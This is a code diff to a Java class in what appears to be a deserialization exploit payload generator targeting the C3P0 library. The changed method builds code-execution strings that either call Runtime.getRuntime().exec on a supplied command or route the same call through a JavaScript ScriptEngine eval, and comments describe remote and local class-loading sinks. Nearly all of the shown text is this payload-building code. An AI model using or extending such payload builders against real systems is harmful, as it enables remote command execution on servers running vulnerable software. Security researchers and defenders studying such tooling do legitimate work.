@@ -3,19 +3,21 @@ package com.ppp.sinks;
 import com.ppp.JavaClassBuilder;
 import com.ppp.JavaClassHelper;
 import com.ppp.Printer;
+import com.ppp.sinks.annotation.EnchantEnums;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.maker.CryptoUtils;
 
 /**
  * @author Whoopsunix
- *
+ * <p>
  * C3P0 专门
  */
 @Sink({Sink.C3P0})
 public class C3P0 {
     /**
      * 远程类加载
+     *
      * @param sinksHelper
      */
     @EnchantType({EnchantType.DEFAULT, EnchantType.RemoteLoad})
@@ -33,17 +35,33 @@ public class C3P0 {
      * @param sinksHelper
      * @return
      */
-    @EnchantType({EnchantType.RUNTIME})
+    @EnchantType({EnchantType.Command})
     public String runtime(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
+        EnchantEnums commandType = sinksHelper.getCommandType();
+
+        Printer.blueInfo("command type: " + commandType);
         Printer.yellowInfo("command: " + command);
 
-        return String.format("Runtime.getRuntime().exec(\"%s\")", command);
-//        return String.format("''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('%s')\")", command);
+        String result;
+        switch (commandType) {
+            case Runtime:
+                result = String.format("Runtime.getRuntime().exec(\"%s\")", command);
+                break;
+            case ScriptEngine:
+                result = String.format("''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('%s')\")", command);
+                break;
+            default:
+                result = command;
+                break;
+        }
+
+        return result;
     }
 
     /**
      * 本地类加载
+     *
      * @param sinksHelper
      * @return
      * @throws Exception
